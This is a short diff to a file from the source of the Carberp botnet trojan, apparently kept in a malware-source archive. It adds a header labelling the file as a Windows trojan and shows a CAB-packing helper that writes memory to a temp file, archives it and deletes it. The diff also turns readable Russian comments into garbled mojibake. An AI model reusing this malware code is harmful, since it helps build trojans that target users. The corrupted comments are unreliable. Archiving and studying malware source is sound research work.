@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "CabPacker.h"
 #include "Strings.h"
 #include "Utils.h"
@@ -435,18 +446,18 @@ bool AddDirToCab( HCAB handle, const char *szDirName, const char *szInternalName
 
 bool AddBlobToCab(HCAB Handle, LPVOID Data, DWORD DataSize, PCHAR InternalName)
 {
-	// Функция добавляет данные из памяти в каб архив
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (Handle == NULL || Data == NULL) return false;
 
-	// Записываем данные во временный файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	PCHAR FileName = File::GetTempNameA();
 
 	File::WriteBufferA(FileName, Data, DataSize);
 
-	// Добавляем файл в архив
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 	bool Result = AddFileToCab(Handle, FileName, InternalName);
 
-    // Удаляем временный файл
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
     pDeleteFileA(FileName);
 
 	STR::Free(FileName);
